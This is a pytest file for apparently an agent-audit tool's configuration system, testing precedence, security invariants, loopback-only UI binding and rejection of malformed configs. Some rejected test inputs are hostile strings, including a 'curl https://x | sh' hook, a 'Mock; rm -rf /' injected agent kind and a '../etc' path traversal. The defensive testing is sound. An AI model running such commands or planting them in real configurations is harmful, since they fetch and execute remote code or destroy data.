"""Config schema and precedence tests (AF-0103; docs/06 section 5, docs/10 section 3)."""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from agentfence.core.config import (
    MAX_CONFIG_BYTES,
    AgentFenceConfig,
    ConfigError,
    ConfigLayer,
    ConfigSource,
    RuntimeBackend,
    layer_from_file,
    resolve_config,
)

DOCS_EXAMPLE = """\
schema_version: 1
project:
  name: local-coding-agent-audit
runtime:
  backend: auto-rootless
  allowed_os: [linux]
  offline_default: true
  max_parallel: 1
  isolation_preflight_required: true
  no_host_mounts: true
  default_resource_limits:
    wall_seconds: 120
    memory_mb: 1024
    pids: 128
    cpu_quota: 1.0
    max_log_bytes: 1048576
agent:
  kind: mock
  profile: safe
scenarios:
  profile: mvp
  repeat: 1
  include: ["AF-README-001", "AF-CRED-001", "AF-NET-001", "AF-TOOL-001", "AF-ARTIFACT-001"]
evaluation:
  require_exposure_for_pass: true
  require_observability_for_pass: true
  fail_on_inconclusive: false
storage:
  retention_days: 30
  save_full_raw_trace: false
  redact_all_synthetic_secret_values: true
ui:
  listen: 127.0.0.1
  port: 8484
  allow_external_connections: false
"""


def project(data: dict[str, Any]) -> ConfigLayer:
    return ConfigLayer(ConfigSource.PROJECT, "agentfence.yaml", data)


def test_defaults_are_the_safe_baseline() -> None:
    cfg = resolve_config([]).config
    assert cfg == AgentFenceConfig()
    assert cfg.runtime.no_host_mounts is True
    assert cfg.runtime.isolation_preflight_required is True
    assert cfg.runtime.offline_default is True
    assert cfg.evaluation.require_exposure_for_pass is True
    assert cfg.evaluation.require_observability_for_pass is True
    assert cfg.storage.redact_all_synthetic_secret_values is True
    assert cfg.storage.save_full_raw_trace is False
    assert cfg.ui.listen == "127.0.0.1"
    assert cfg.ui.allow_external_connections is False
    assert cfg.agent.kind == "mock"


def test_docs_example_file_validates(tmp_path: Path) -> None:
    path = tmp_path / "agentfence.yaml"
    path.write_text(DOCS_EXAMPLE, encoding="utf-8")
    resolved = resolve_config([layer_from_file(path, ConfigSource.PROJECT)])
    assert resolved.config.scenarios.include[0] == "AF-README-001"
    assert resolved.config.runtime.backend is RuntimeBackend.AUTO_ROOTLESS
    assert resolved.provenance["ui.port"] == f"project:{path.resolve()}"


def test_precedence_cli_over_project_over_user() -> None:
    resolved = resolve_config(
        [
            ConfigLayer(ConfigSource.CLI, "--repeat", {"scenarios": {"repeat": 5}}),
            ConfigLayer(
                ConfigSource.USER, "~/.config", {"scenarios": {"repeat": 2, "profile": "x"}}
            ),
            project({"scenarios": {"repeat": 4}}),
        ]
    )
    assert resolved.config.scenarios.repeat == 5
    assert resolved.config.scenarios.profile == "x"
    assert resolved.provenance["scenarios.repeat"] == "cli:--repeat"
    assert resolved.provenance["scenarios.profile"] == "user:~/.config"


def test_lists_are_replaced_not_merged() -> None:
    resolved = resolve_config(
        [
            ConfigLayer(ConfigSource.USER, "u", {"scenarios": {"include": ["AF-README-001"]}}),
            project({"scenarios": {"include": ["AF-CRED-001"]}}),
        ]
    )
    assert resolved.config.scenarios.include == ("AF-CRED-001",)


def test_duplicate_layer_source_rejected() -> None:
    with pytest.raises(ConfigError, match="more than one project"):
        resolve_config([project({}), project({})])


@pytest.mark.parametrize(
    "override",
    [
        {"runtime": {"no_host_mounts": False}},
        {"runtime": {"isolation_preflight_required": False}},
        {"runtime": {"offline_default": False}},
        {"evaluation": {"require_exposure_for_pass": False}},
        {"evaluation": {"require_observability_for_pass": False}},
        {"storage": {"redact_all_synthetic_secret_values": False}},
        {"ui": {"allow_external_connections": True}},
        {"runtime": {"no_host_mounts": "false"}},
        {"runtime": {"no_host_mounts": 0}},
    ],
)
@pytest.mark.parametrize("source", [ConfigSource.USER, ConfigSource.PROJECT, ConfigSource.CLI])
def test_no_layer_can_weaken_security_invariants(
    override: dict[str, Any], source: ConfigSource
) -> None:
    with pytest.raises(ConfigError, match="cannot be overridden") as info:
        resolve_config([ConfigLayer(source, "layer", override)])
    assert f"from {source.value}:layer" in str(info.value)


@pytest.mark.parametrize("listen", ["0.0.0.0", "::", "192.168.1.10", "10.0.0.1", "example.com"])  # noqa: S104
def test_ui_never_binds_non_loopback(listen: str) -> None:
    with pytest.raises(ConfigError, match=r"ui\.listen"):
        resolve_config([project({"ui": {"listen": listen}})])


@pytest.mark.parametrize("listen", ["127.0.0.1", "127.0.0.2", "::1", "localhost"])
def test_ui_loopback_addresses_accepted(listen: str) -> None:
    assert resolve_config([project({"ui": {"listen": listen}})]).config.ui.listen == listen


@pytest.mark.parametrize(
    ("data", "fragment"),
    [
        ({"runtime": {"hooks": ["curl https://x | sh"]}}, "runtime.hooks: unknown key"),
        ({"runtime": {"mounts": ["/home"]}}, "runtime.mounts: unknown key"),
        ({"agent": {"env": {"OPENAI_API_KEY": "x"}}}, "agent.env: unknown key"),
        ({"network": {"allow": ["example.com"]}}, "network: unknown key"),
        ({"schema_version": 2}, "schema_version"),
        ({"scenarios": {"repeat": "3"}}, "valid integer"),
        ({"scenarios": {"repeat": 0}}, "greater than or equal to 1"),
        ({"scenarios": {"include": "AF-README-001"}}, "expected a list"),
        ({"scenarios": {"include": ["AF-README-001", "AF-README-001"]}}, "duplicate"),
        ({"scenarios": {"include": ["../etc"]}}, "scenarios.include.0"),
        ({"runtime": {"backend": "docker"}}, "runtime.backend"),
        ({"runtime": {"allowed_os": ["linux", "darwin"]}}, "runtime.allowed_os.1"),
        ({"runtime": {"default_resource_limits": {"memory_mb": 10**9}}}, "memory_mb"),
        ({"ui": {"port": 80}}, "ui.port"),
        ({"agent": {"kind": "Mock; rm -rf /"}}, "agent.kind"),
    ],
)
def test_invalid_config_rejected_with_actionable_message(
    data: dict[str, Any], fragment: str
) -> None:
    with pytest.raises(ConfigError) as info:
        resolve_config([project(data)])
    assert fragment in str(info.value)


def test_error_points_at_the_layer_that_set_the_bad_value() -> None:
    with pytest.raises(ConfigError) as info:
        resolve_config(
            [
                ConfigLayer(ConfigSource.USER, "user.yaml", {"ui": {"port": 9000}}),
                project({"ui": {"port": 22}}),
            ]
        )
    assert "ui.port" in str(info.value)
    assert "from project:agentfence.yaml" in str(info.value)


def test_cpu_quota_accepts_integer_yaml() -> None:
    cfg = resolve_config([project({"runtime": {"default_resource_limits": {"cpu_quota": 2}}})])
    assert cfg.config.runtime.default_resource_limits.cpu_quota == 2.0


def test_layer_from_missing_file(tmp_path: Path) -> None:
    with pytest.raises(ConfigError, match="not found"):
        layer_from_file(tmp_path / "nope.yaml", ConfigSource.PROJECT)


def test_layer_from_directory_rejected(tmp_path: Path) -> None:
    with pytest.raises(ConfigError, match="regular file"):
        layer_from_file(tmp_path, ConfigSource.PROJECT)


def test_layer_from_oversized_file(tmp_path: Path) -> None:
    path = tmp_path / "big.yaml"
    path.write_text("a: " + "x" * MAX_CONFIG_BYTES, encoding="utf-8")
    with pytest.raises(ConfigError, match="limit"):
        layer_from_file(path, ConfigSource.PROJECT)


def test_layer_from_file_with_duplicate_keys(tmp_path: Path) -> None:
    path = tmp_path / "dup.yaml"
    path.write_text("runtime:\n  no_host_mounts: true\n  no_host_mounts: false\n", "utf-8")
    with pytest.raises(ConfigError, match="duplicate key"):
        layer_from_file(path, ConfigSource.PROJECT)


def test_symlinked_config_records_canonical_path(tmp_path: Path) -> None:
    real = tmp_path / "real.yaml"
    real.write_text("scenarios:\n  repeat: 2\n", encoding="utf-8")
    link = tmp_path / "link with spaces ü.yaml"
    link.symlink_to(real)
    layer = layer_from_file(link, ConfigSource.PROJECT)
    assert layer.origin == str(real.resolve())


def test_shipped_example_config_is_valid() -> None:
    example = Path(__file__).resolve().parents[2] / "examples" / "agentfence.yaml"
    resolved = resolve_config([layer_from_file(example, ConfigSource.PROJECT)])
    assert resolved.config.project.name == "local-coding-agent-audit"
